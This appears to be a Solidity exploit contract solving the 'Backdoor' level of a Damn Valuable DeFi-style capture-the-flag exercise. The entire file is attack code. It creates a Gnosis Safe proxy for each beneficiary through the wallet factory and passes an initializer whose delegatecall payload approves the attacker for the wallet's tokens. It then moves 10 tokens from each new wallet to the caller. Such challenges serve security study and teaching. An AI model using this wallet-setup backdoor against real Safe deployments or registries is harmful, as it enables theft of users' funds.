// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";

import "../DamnValuableToken.sol";

contract backdoorAttack {
    address public masterCopy;
    address public walletFactory;
    address public token;
    address public walletRegistry;

    constructor(
        address _masterCopy,
        address _walletFactory,
        address _token,
        address _walletRegistry
    ) {
        masterCopy = _masterCopy;
        walletFactory = _walletFactory;
        token = _token;
        walletRegistry = _walletRegistry;
    }

    function approveToken(address _token, address _attacker) external {
        DamnValuableToken(_token).approve(_attacker, 10 ether);
    }

    function attack(address[] memory users) external {
        //repeat the same for each users
        for (uint256 i = 0; i < users.length; i++) {
            address[] memory user = new address[](1);
            user[0] = users[i];

            bytes memory payload = abi.encodeWithSignature(
                "approveToken(address,address)",
                token,
                address(this)
            );

            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                user, 
                1, 
                address(this),
                payload, 
                address(0),
                address(0),
                0,
                address(0)
            );

            GnosisSafeProxy proxy = GnosisSafeProxyFactory(walletFactory)
                .createProxyWithCallback(
                    masterCopy,
                    initializer,
                    0,
                    IProxyCreationCallback(walletRegistry)
                );

            DamnValuableToken(token).transferFrom(
                address(proxy),
                msg.sender,
                10 ether
            );
        }
    }
}